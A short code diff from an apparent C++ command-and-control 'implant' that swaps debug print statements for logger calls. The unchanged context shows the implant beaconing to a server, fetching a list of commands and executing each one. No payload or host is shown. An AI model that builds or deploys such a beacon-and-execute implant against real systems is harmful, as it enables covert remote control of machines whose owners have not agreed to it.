@@ -39,7 +39,7 @@ int main(int argc, char* argv[]) {
     }
 
     if constexpr (debug_print) {
-        std::println("Starting main logic of the implant...");
+        logger::info("Starting main logic of the implant...");
     }
 
     // If we are not in Installation mode
@@ -55,12 +55,12 @@ int main(int argc, char* argv[]) {
         std::vector<CommandDAO> command_list = sendBeacon(rest_client);
 
         if constexpr (debug_print) {
-            std::println("UUID: {} | Count of Commands: {}", get_or_create_id(), command_list.size());
+            logger::info("UUID: {} | Count of Commands: {}", get_or_create_id(), command_list.size());
         }
 
         for (const auto& cmd : command_list) {
             if constexpr (debug_print) {
-                std::println("Executing Command:\n- UUID: {}\n- CLIENT: {}\n- COMMAND: {}", cmd.uid, cmd.client, cmd.command);
+                logger::info("Executing Command:\n- UUID: {}\n- CLIENT: {}\n- COMMAND: {}", cmd.uid, cmd.client, cmd.command);
             }
 
             CommandResult res;
@@ -112,7 +112,7 @@ int main(int argc, char* argv[]) {
     }
 
     if constexpr (debug_print) {
-        std::println("Shutting down Implant!");
+        logger::info("Shutting down Implant!");
     }
 
     return 0;
